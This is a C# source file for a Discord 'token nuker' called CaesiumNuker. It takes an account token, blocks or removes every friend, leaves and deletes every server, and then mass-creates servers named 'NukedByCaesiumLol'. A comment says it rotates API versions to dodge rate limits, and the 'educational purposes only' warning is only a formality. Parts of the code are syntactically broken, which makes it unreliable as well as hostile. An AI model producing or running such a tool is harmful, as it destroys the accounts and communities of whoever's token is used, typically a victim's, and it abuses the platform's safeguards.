using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;
using Discord;
using System.Threading;
int api  = rnd.Next(6, 9);  // random api version to bypass ratelimits between api versions
Random rnd = new Random();
namespace CaesiumNuker
{
    internal class Program
    {
    
        // lol
        public class User
        {
            public string id { get; set; }
            public string username { get; set; }
            public string avatar { get; set; }
            public string discriminator { get; set; }
            public int public_flags { get; set; }
        }
        
        public static void RemoveFriends(string Token)
        {
            var client1 = new HttpClient();

            client1.DefaultRequestHeaders.Add("Authorization", Token);

            var response = client1.GetAsync("https://discord.com/api/v8/users/@me/relationships").Result;


            var jsonString = response.Content.ReadAsStringAsync();


            jsonString.Wait();
            var model = JsonConvert.DeserializeObject<List<User>>(jsonString.Result);

            foreach (var x in model)
            {

                Console.WriteLine("Deleted Friend " + x.username + " (" + x.id + ")");
                client1.PutAsync("https://discord.com/api/v8/users/@me/relationships/" + x.id, new StringContent("{\"type\":\"2\"}", Encoding.UTF8, "application/json"));

            }
            }

            static void Main(string[] args)
        {
            Console.Title = "\\ Caesium! // ";
            //Logo
            string ascii = @" ▄████▄   ▄▄▄      ▓█████   ██████  ██▓ █    ██  ███▄ ▄███▓
▒██▀ ▀█  ▒████▄    ▓█   ▀ ▒██    ▒ ▓██▒ ██  ▓██▒▓██▒▀█▀ ██▒
▒▓█    ▄ ▒██  ▀█▄  ▒███   ░ ▓██▄   ▒██▒▓██  ▒██░▓██    ▓██░
▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒▓█  ▄   ▒   ██▒░██░▓▓█  ░██░▒██    ▒██ 
▒ ▓███▀ ░ ▓█   ▓██▒░▒████▒▒██████▒▒░██░▒▒█████▓ ▒██▒   ░██▒
░ ░▒ ▒  ░ ▒▒   ▓▒█░░░ ▒░ ░▒ ▒▓▒ ▒ ░░▓  ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
  ░  ▒     ▒   ▒▒ ░ ░ ░  ░░ ░▒  ░ ░ ▒ ░░░▒░ ░ ░ ░  ░      ░
░          ░   ▒      ░   ░  ░  ░   ▒ ░ ░░░ ░ ░ ░      ░   
░ ░            ░  ░   ░  ░      ░   ░     ░            ░   
░                                                          ";

            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine(ascii);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Warning! this tools is used for educational purposes only, Nukers are against Discord and you can get banned!");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.Write("1");
    
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.Write("Token");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("nuker");
                        Console.WriteLine("");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(">");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.Write("> ");
            Console.ForegroundColor = ConsoleColor.White;
            string dog = Console.ReadLine();
            if(dog == "1")
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine(ascii);
                Console.WriteLine("");
                Console.WriteLine("");
                Console.ForegroundColor = ConsoleColor.White;
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("token");
                Console.WriteLine("");
                Console.WriteLine("");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(">");
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.Write("> ");
                Console.ForegroundColor = ConsoleColor.White;
                string token = Console.ReadLine();
                //Login to discord token
                DiscordClient client = new DiscordClient(token, null);
                RemoveFriends(token);
                void NUKE()
                {

                    foreach (var gildie in client.GetGuilds())
                    {
                        //Getting all guilds and leaving them
                        gildie.Leave();
                        Console.WriteLine("Leaving guilds...");
                        Thread.Sleep(60);
                        foreach (var gildiea in client.GetGuilds())
                        {
                            //Getting all guilds and deleting them

                            gildiea.Delete();
                            Console.WriteLine("Deleting guilds...");
                            Thread.Sleep(20);
                            NUKE2();


                        }
                    }



                }
                void NUKE2()
                {


                                //Creating guilds
            var loop = new Loop(100);
                        foreach(var index loop) {
                            client.CreateGuild("NukedByCaesiumLol", null, null);

                        }
                    
                   

                    Console.WriteLine("Creating Guilds...");

                    Console.Write("Press any key ");
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;
                    Console.Write("to back ");
                    Console.ForegroundColor = ConsoleColor.White;

                    Console.ReadKey();
                    Console.Clear();
                    Program.Main(args);
                }
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine(ascii);
                Console.WriteLine("");
                Console.WriteLine("");
                Console.ForegroundColor = ConsoleColor.White;
                NUKE();

               

            }
           
           
        }
    }
}
